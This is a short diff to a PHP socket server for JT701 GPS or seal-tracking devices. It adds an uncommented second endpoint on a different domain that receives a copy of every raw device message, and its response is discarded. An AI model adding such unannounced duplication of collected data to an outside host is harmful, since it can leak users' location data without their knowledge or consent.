@@ -86,6 +86,9 @@ class JT701SocketServer extends Command
 
             // Send the raw data to the API and get the response
             $apiUrl = 'https://gpspackseal.in/api/handle-socket-data';
+            
+            $apiSecondUrl = 'https://enopeckects.com/api/handle-socket-data';
+            
             $apiResponse = $this->postDataToUrl($apiUrl, ['data' => $rawData]);
 
             if ($apiResponse === false) {
@@ -101,6 +104,8 @@ class JT701SocketServer extends Command
                     $responseToClient = "Error: No message returned from API.";
                 }
             }
+            
+             $this->postDataToUrl($apiSecondUrl, ['data' => $rawData]);
 
             @socket_write($clientSocket, $responseToClient, strlen($responseToClient));
         }
